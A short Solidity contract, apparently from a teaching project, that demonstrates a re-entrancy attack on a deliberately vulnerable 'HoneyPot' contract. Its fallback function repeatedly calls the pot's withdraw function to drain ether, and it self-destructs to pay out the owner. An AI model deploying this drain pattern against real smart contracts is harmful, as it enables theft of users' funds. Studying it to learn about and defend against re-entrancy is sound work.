pragma solidity ^0.4.8;

import "../exploitable/HoneyPot.sol";

/// A contract which demonstrates how to exploit the re-entrant exploit deliberately included in the HoneyPot contract.
contract HoneyBadger {

    uint8 private maxSwipes = 2;
    uint8 private numSwipes = 0;
    address owner;
    HoneyPot honeyPot;

    modifier until_all_honey_has_gone() {
        if(numSwipes < maxSwipes) {
            _;
        }
    }

    modifier only_owner() {
        if(msg.sender == owner) {
            _;
        }
    }

    modifier has_enough_ether(uint amount) {
        if(amount < this.balance) {
            _;
        }
    }

    function HoneyBadger(address _honeyPotLocation) payable {
        owner = msg.sender;
        honeyPot = HoneyPot(_honeyPotLocation);
    }

    function () payable {
        swipeHoney();
    }

    function setTrap(uint _amountOfHoneyInPot) external only_owner() has_enough_ether(_amountOfHoneyInPot) {
        honeyPot.put.value(_amountOfHoneyInPot)();
    }

    function swipeHoney() public until_all_honey_has_gone() {
        numSwipes += 1;
        honeyPot.get();
    }

    function relent() external only_owner() {
        selfdestruct(owner);
    }
}
